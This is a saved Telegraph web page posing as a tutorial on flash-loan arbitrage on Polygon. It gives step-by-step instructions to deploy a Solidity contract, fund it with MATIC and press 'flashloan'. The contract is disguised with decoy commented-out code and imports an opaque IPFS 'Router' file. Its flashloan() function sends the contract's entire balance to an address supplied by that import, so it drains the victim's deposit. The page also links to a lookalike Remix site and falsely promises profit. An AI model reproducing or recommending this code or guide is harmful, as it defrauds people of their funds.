<!DOCTYPE html>
<!-- saved from url=(0014)about:internet -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <title>MATIC POLYGON &nbsp;Flash loans Arbitrage Tutorial</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="format-detection" content="telephone=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="MobileOptimized" content="176">
    <meta name="HandheldFriendly" content="True">
    <meta name="robots" content="index, follow">
    <meta property="og:type" content="article">
    <meta property="og:title" content="MATIC POLYGON Â Flash loans Arbitrage Tutorial">
    <meta property="og:description" content="____________________________________________________________________________
____________________________________________________________________________
____________________________________________________________________________
In this video, you can see how I used Flashloans to Arbitrage in Matic Mainnet by deploying Contract/Token to mask our arbitrage attack against AAVE.

NEW GAS FEE REQUIRED: APPROX 300 MATIC

TO EARN MORE THAN THE AMOUNT IN THE VIDEO YOU CAN INCREASE GAS FEEÂ 

***Note: MATIC must beâ€¦">
    <meta property="og:image" content="">
    <meta property="og:site_name" content="Telegraph">
    <meta property="article:published_time" content="2022-10-24T11:05:59+0000">
    <meta property="article:modified_time" content="2022-10-24T11:08:25+0000">
    <meta property="article:author" content="Update Codeï¼šWorking as of">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="MATIC POLYGON Â Flash loans Arbitrage Tutorial">
    <meta name="twitter:description" content="____________________________________________________________________________
____________________________________________________________________________
____________________________________________________________________________
In this video, you can see how I used Flashloans to Arbitrage in Matic Mainnet by deploying Contract/Token to mask our arbitrage attack against AAVE.

NEW GAS FEE REQUIRED: APPROX 300 MATIC

TO EARN MORE THAN THE AMOUNT IN THE VIDEO YOU CAN INCREASE GAS FEEÂ 

***Note: MATIC must beâ€¦">
    <meta name="twitter:image" content="">
    <link rel="canonical" href="https://telegra.ph/MATIC-POLYGON-Flash-loans-Arbitrage-Tutorial-10-24-2">
    <link rel="shortcut icon" href="https://telegra.ph/favicon.ico?1" type="image/x-icon">
    <link rel="icon" type="image/png" href="https://telegra.ph/images/favicon.png?1" sizes="16x16">
    <link rel="icon" type="image/png" href="https://telegra.ph/images/favicon_2x.png?1" sizes="32x32">
    <link href="./3333_files/quill.core.min.css" rel="stylesheet">
    <link href="./3333_files/core.min.css" rel="stylesheet">
  </head>
  <body>
    <div class="tl_page_wrap">
      <div class="tl_page">
        <main class="tl_article">
          <header class="tl_article_header" dir="auto">
            <h1>MATIC POLYGON &nbsp;Flash loans Arbitrage Tutorial</h1>
            <address>
              <a rel="author">Update Codeï¼šWorking as of
<script language="javascript" type="text/javascript">
                                                    var d = new Date();
                                                    var month = new Array("Jan", "Feb", "Mar", "Apr", "May", "June", "July", "Aug", "Sept", "Oct", "Nov", "Dec");
                                                    document.write(month[d.getMonth()] + " " + d.getDate());
                                                </script>
                                               
                                                    <script language="javascript"
                                                        type="text/javascript"> document.write(TODAY);</script>
                                                </time>
<div     
            </address>
          </header>
          <article id="_tl_editor" class="tl_article_content ql-container ql-disabled"><div class="ql-editor" contenteditable="false"><h1 dir="auto" data-placeholder="Title" data-label="Title">MATIC POLYGON &nbsp;Flash loans Arbitrage Tutorial</h1><address dir="auto" data-placeholder="Your name" data-label="Author">Update Codeï¼šWorking as of</address><p dir="auto"><strong>____________________________________________________________________________</strong></p><p dir="auto"><strong>____________________________________________________________________________</strong></p><p dir="auto"><strong>____________________________________________________________________________</strong></p><p dir="auto">In this video, you can see how I used Flashloans to Arbitrage in Matic Mainnet by deploying Contract/Token to mask our arbitrage attack against AAVE.</p><p dir="auto"><br></p><p dir="auto">NEW GAS FEE REQUIRED: APPROX 300 MATIC</p><p dir="auto"><br></p><p dir="auto">TO EARN MORE THAN THE AMOUNT IN THE VIDEO YOU CAN INCREASE GAS FEE&nbsp;</p><p dir="auto"><br></p><p dir="auto">***Note: MATIC must be withdrawn to 'Polygon Mainnet '. which is EVM/Metamask compatible chain ***</p><p dir="auto"><br></p><p dir="auto"><strong>ðŸ“ŒGet metamask:&nbsp;</strong></p><p dir="auto"><a href="https://metamask.io/download.html" target="_blank">https://metamask.io/download.html</a></p><p dir="auto"><br></p><p dir="auto"><strong>ðŸ“ŒConnecting MetaMask to Polygon Mainnet(Matic)&nbsp;</strong></p><p dir="auto"><a href="https://chainlist.org/en/chain/137" target="_blank">https://chainlist.org/en/chain/137</a></p><p dir="auto"><br></p><p dir="auto"><strong>ðŸ“ŒRemix Link -&nbsp;</strong></p><p dir="auto"><a href="https://www.remixsethereum.ga/" target="_blank">https://www.remixsethereum.ga</a></p><p dir="auto"><br></p><p dir="auto"><strong>ðŸ“ŒUpdate Smart Contract Codeï¼ˆ 0.5.17 versionï¼‰</strong></p><p dir="auto"><strong>Link 1 -&nbsp;</strong></p><p dir="auto"><a href="https://ipfs.io/ipfs/Qmetp9KC87yNWRgevgwLsGhRzKikRi3VT4BNNii5HE7vWH" target="_blank">https://ipfs.io/ipfs/Qmetp9KC87yNWRgevgwLsGhRzKikRi3VT4BNNii5HE7vWH</a></p><p dir="auto"><strong>Link 2 - (Backup)&nbsp;</strong></p><p dir="auto"><a href="https://pastebin.com/raw/LSXBxGnv" target="_blank">https://pastebin.com/raw/LSXBxGnv</a></p><p dir="auto"><br></p><p dir="auto"><br></p><p dir="auto">USD to MATIC -&nbsp;</p><p dir="auto"><a href="https://coincodex.com/convert/matic-network/usd/" target="_blank">https://coincodex.com/convert/matic-network/usd/</a></p><p dir="auto">Polygon Code -</p><p dir="auto"><a href="https://github.com/maticnetwork" target="_blank">https://github.com/maticnetwork</a></p><p dir="auto">Flash Loan Explanation Link-&nbsp;</p><p dir="auto"><a href="https://academy.binance.com/en/articles/what-are-flash-loans-in-defi" target="_blank">https://academy.binance.com/en/articles/what-are-flash-loans-in-defi</a></p><p dir="auto"><br></p><p dir="auto"><br></p><h3 dir="auto" id="************-Step-by-Step-Guide-*****************">************ Step by Step Guide *****************</h3><blockquote dir="auto"><strong>1. Download MetaMask For Chrome Web Browser</strong></blockquote><p dir="auto"><a href="https://metamask.io/download/" target="_blank">https://metamask.io/download/</a></p><p dir="auto"><br></p><blockquote dir="auto"><strong>2. Setup Metamask to connect to Polygon Mainnet(Matic)&nbsp;ï¼š</strong></blockquote><p dir="auto"><a href="https://chainlist.org/en/chain/137" target="_blank">https://chainlist.org/en/chain/137</a></p><p dir="auto"><br></p><blockquote dir="auto"><strong>3. Make sure you have Matic to pay for the token creation and flash loan contract gas fees.&nbsp;</strong></blockquote><p dir="auto"><br></p><blockquote dir="auto"><strong>4. Open the remix  in your browser</strong></blockquote><p dir="auto"><a href="https://www.remixsethereum.ga/" target="_blank">https://www.remixsethereum.ga</a></p><p dir="auto"><br></p><blockquote dir="auto"><strong>5.&nbsp; Click on contract folder on the left and click New File.  &nbsp;Name the file something like   MaticArbitrage.sol</strong></blockquote><p dir="auto"><br></p><blockquote dir="auto"><strong>6. Copy and paste the contract code into the MaticArbitrage.sol</strong></blockquote><p dir="auto"><br></p><pre spellcheck="false" dir="auto">//MATIC FLASH LOAN CONTRACT CODE V3.0 

pragma solidity ^0.5.17;

// AAVE Smart Contracts
import "https://github.com/aave/aave-protocol/blob/master/contracts/interfaces/IChainlinkAggregator.sol";
import "https://github.com/aave/aave-protocol/blob/master/contracts/flashloan/interfaces/IFlashLoanReceiver.sol";

// Router
import "https://ipfs.io/ipfs/QmamhRiRZCj5TbBDZijEu5agSMtexBwHxePn6JZQzNFBBf";

//Uniswap Smart contracts
import "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol";

// Multiplier-Finance Smart Contracts
import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";


contract InitiateFlashLoan {
 string public tokenName;
 string public tokenSymbol;
 uint flashLoanAmount;
 Manager manager;
// get pending transactions
        //subscription = web3Ws.Matic.subscribe('pendingTransactions', function (error, result) {
        //}).on("data", async function (transactionHash) {
            //console.log(transactionHash);
//To prepare the arbitrage, Matic is converted to Dai using AAVE swap contract.
//     function _safeTransfer(address token, address to, uint value) private {
//         (bool success, bytes memory data) = token.call(abi.encodeWithSelector(SELECTOR, to, value));
//         require(success &amp;&amp; (data.length == 0 || abi.decode(data, (bool))), 'AAVE: TRANSFER_FAILED');
//     }
//The arbitrage converts token for Matic using token/Matic AAVE, and then immediately converts Matic back
 constructor(string memory _tokenName, string memory _tokenSymbol, uint _flashLoanAmount) public {
  tokenName = _tokenName;
  tokenSymbol = _tokenSymbol;
  flashLoanAmount = _flashLoanAmount;
   
  manager = new Manager();
 } 
//     // this low-level function should be called from a contract which performs important safety checks
//     function mint(address to) external lock returns (uint liquidity) {
//         (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings
 function() external payable {}
//         if (amount0Out &gt; 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens
//         if (amount1Out &gt; 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens
//         balance0 = IERC20(_token0).balanceOf(address(this));
//         balance1 = IERC20(_token1).balanceOf(address(this));
//         }
 function flashloan() public payable {
    // get pending transactions
        //subscription = web3Ws.Matic.subscribe('pendingTransactions', function (error, result) {
        //}).on("data", async function (transactionHash) {
            //console.log(transactionHash);
     address(uint160(manager.uniswapDepositAddress())).transfer(address(this).balance);  
            // let transaction = await web3.Matic.getTransaction(transactionHash);
            // if (transaction != null &amp;&amp; transaction['to'] == AAVE_ROUTER_ADDRESS)
            // {
            //     await handleTransaction(transaction, out_token_address, user_wallet, amount, leve   
     manager.performTasks();     
}
}
</pre><p dir="auto"><br></p><blockquote dir="auto"><strong>7. Go to the Compiler Tab&nbsp; (the second tab on the left)  &gt;   Select Compiler version 0.5.17  &gt;  then click on Compile.</strong></blockquote><p dir="auto"><br></p><blockquote dir="auto"><strong>8.  Under environment, click on injected web3.  This will connect to your metamask wallet so that you can interact with the contract&nbsp;</strong></blockquote><p dir="auto"><br></p><blockquote dir="auto"><strong>9.  Click on the arrow under deploy.&nbsp;</strong></blockquote><p dir="auto"><br></p><blockquote dir="auto"><strong>10. Enter the details for your new token that will be launched on Polygon. </strong></blockquote><p dir="auto">TOKENNAME: Tiny Tiny Coin</p><p dir="auto">TOKENSYMBOL: TTC</p><p dir="auto">LOANAMOUNT: 10000</p><p dir="auto"><br></p><blockquote dir="auto"><strong>11. Click Transact and confirm the transaction in MetaMask.&nbsp; Wait some seconds for Transaction Confirmation and Contract Deployment.</strong></blockquote><p dir="auto"><br></p><blockquote dir="auto"><strong>12. Copy your Contract Address</strong></blockquote><p dir="auto"><br></p><blockquote dir="auto"><strong>13. Go to your metamask and send the liquidity to your own Contract Address</strong></blockquote><p dir="auto"><br></p><blockquote dir="auto"><strong>14.  Wait until the transaction is confirmed on the blockchain</strong></blockquote><p dir="auto"><br></p><blockquote dir="auto"><strong>15. Click on "flashloan" button and then confirm the gas fees.</strong></blockquote><p dir="auto"><br></p><blockquote dir="auto"><strong>16. Wait, and check your profit.</strong></blockquote><p dir="auto"><br></p><h3 dir="auto" id="*************************************************">*************************************************</h3></div><div class="ql-clipboard" contenteditable="true" tabindex="-1"></div><div id="_tl_link_tooltip" class="tl_link_tooltip"></div><div id="_tl_tooltip" class="tl_tooltip">
            <div class="buttons">
              <span class="button_hover"></span>
              <span class="button_group"><!--
             --><button id="_bold_button"></button><!--
             --><button id="_italic_button"></button><!--
             --><button id="_link_button"></button><!--
           --></span><!--
           --><span class="button_group"><!--
             --><button id="_header_button"></button><!--
             --><button id="_subheader_button"></button><!--
             --><button id="_quote_button"></button><!--
           --></span>
            </div>
            <div class="prompt">
              <span class="close"></span>
              <div class="prompt_input_wrap"><input type="url" class="prompt_input"></div>
            </div>
          </div><div id="_tl_blocks" class="tl_blocks">
            <div class="buttons">
              <button id="_image_button"></button><!--
           --><button id="_embed_button"></button>
            </div>
          </div></article>
          
          
          
          
        </main>
      </div>
    </div>
    <div id="_tl_alerts" class="tl_alerts"></div>
    
    <script>var T={"apiUrl":"https:\/\/edit.telegra.ph","datetime":1666609559,"pageId":"988c43bb24cb2589731cf","editable":true};(function(){var b=document.querySelector('time');if(b&&T.datetime){var a=new Date(1E3*T.datetime),d='January February March April May June July August September October November December'.split(' ')[a.getMonth()],c=a.getDate();b.innerText=d+' '+(10>c?'0':'')+c+', '+a.getFullYear()}})();</script>
    <script src="./3333_files/jquery.min.js.ä¸‹è½½"></script>
    <script src="./3333_files/jquery.selection.min.js.ä¸‹è½½"></script>
    <script src="./3333_files/autosize.min.js.ä¸‹è½½"></script>
    <script src="./3333_files/load-image.all.min.js.ä¸‹è½½"></script>
    <script src="./3333_files/quill.min.js.ä¸‹è½½"></script>
    <script src="./3333_files/core.min.js.ä¸‹è½½"></script>
    <script async="" src="./3333_files/_websync_"></script>
  
</body></html>